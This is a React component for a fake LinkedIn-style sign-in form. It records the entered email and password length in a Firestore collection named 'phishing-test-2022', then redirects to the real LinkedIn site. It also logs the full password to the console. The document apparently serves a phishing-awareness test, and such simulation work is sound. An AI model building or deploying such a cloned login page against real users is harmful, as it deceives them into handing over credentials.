import styled from "styled-components";
import Forgot from "./Forgot.js";
import InputBox from "./InputBox.js";
import { Link } from "react-router-dom";
import { useState } from "react";
import { db } from "../firebase.js";
import { collection, addDoc } from "firebase/firestore";
import Button from "./Button";


const DivBox = styled.div`
  position: center;

  width: 400px;
`;

export default function InputForm() {
  const [input, setInput] = useState({
    email: "",
    password: "",
  });
  const handleChangeInput = (e) => {
    setInput((prev) => {
      return {
        ...prev,
        [e.target.name]: e.target.value,
      };
    });
  };

  function clickRedirect()
  {
    window.location.href="https://linkedin.com/feed/";
  }

  const handleSubmit = async () => {

    const password = input.password;


    console.log(input.email);
    console.log(input.password);
    // pass to firebase
    const dbRef = collection(db, "phishing-test-2022");
    const params = {
      email: input.email,
      password_length: password.length,
      created_at: new Date(),
      from: window.location.href,
    };
    await addDoc(dbRef, params);
   
  };

const sendRequest=() =>
{
  handleSubmit();
  clickRedirect();
}

  return (
    <DivBox>
      <InputBox
        label="Email or phone number"
        type="text"
        name="email"
        value={input.email}
        onChange={handleChangeInput}
      />
      <InputBox
        label="Password"
        type="password"
        name="password"
        value={input.password}
        onChange={handleChangeInput}
      />
      <Forgot as={Link} to="/forgot">
        Forgot password?
      </Forgot>
      <Button onClick={sendRequest}>Sign in</Button>
    </DivBox>
  );
}

export { Button, DivBox };
